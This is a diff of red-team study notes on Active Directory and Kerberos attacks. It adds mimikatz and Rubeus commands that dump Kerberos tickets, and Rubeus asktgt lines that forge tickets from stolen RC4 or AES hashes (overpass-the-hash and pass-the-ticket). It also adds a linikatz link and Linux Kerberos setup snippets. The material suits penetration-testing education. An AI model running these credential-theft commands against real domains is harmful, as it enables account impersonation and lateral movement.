@@ -91,6 +91,24 @@ PS> klist # list current tickets available
 
 As SYSTEM on a domain-joined computer, we can extract the computer account Hash or Ticket to perform a [Pth](/cybersecurity/red-team/s4.privesc/index.md#pass-the-hash-pth)/[Ptt](/cybersecurity/red-team/s4.privesc/index.md#pass-the-hash-pth) attack.
 
+```shell!
+mimikatz# sekurlsa::tickets /export # dump tickets
+CMD> dir *.kirbi # @krbtgt == TGT
+```
+
+```ps
+PS> .\Rubeus.exe dump /nowrap # Dump tickets
+```
+
+If we have the RC4/AES hash, we can create tickets too:
+
+```shell!
+PS> # Pass the Key / OverPass the Hash == create a ticket
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
+PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
+```
+
 📚 The KRBTGT service account is used to encrypt/sign all Kerberos tickets granted within a given domain. Given the NT hash for the KRBTGT account, we can forge [golden/silver](/cybersecurity/red-team/s5.post-exploitation/index.md#-lateral-movement---goldensilver-ticket) tickets.
 </div></div>
 
@@ -545,6 +563,8 @@ $ realm list
   permitted-groups: XXX
 ```
 
+➡️ See also: [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐, 2023 🪦)</small>. 
+
 <br>
 
 #### Active Directory On Linux — Kerberos Configuration
@@ -559,6 +579,8 @@ If Kerberos client is installed, you will be able to use `klist`. The configurat
         ticket_lifetime = 24h
         renew_lifetime = 7d
         forwardable = true
+        # kdc_timesync = 1
+        # ccache_type = 4
 
 [realms]
     EXAMPLE.COM = {
@@ -573,12 +595,19 @@ If Kerberos client is installed, you will be able to use `klist`. The configurat
 
 And the files `/etc/hosts` and `/etc/resolv.conf` must be set so that we can at the very least resolve `DC01.EXAMPLE.COM`.
 
-```
+```shell!
 $ cat /etc/hosts
 172.16.5.5 EXAMPLE.COM
 172.16.5.5 DC01 DC01.EXAMPLE.COM
 ```
 
+#### Active Directory On Linux — Get A Ticket
+
+You can request a ticket for `dummy` using:
+
+```shell!
+$ kinit dummy@EXAMPLE.COM
+```
 </div><div>
 
 #### Active Directory On Linux — Managing Tickets
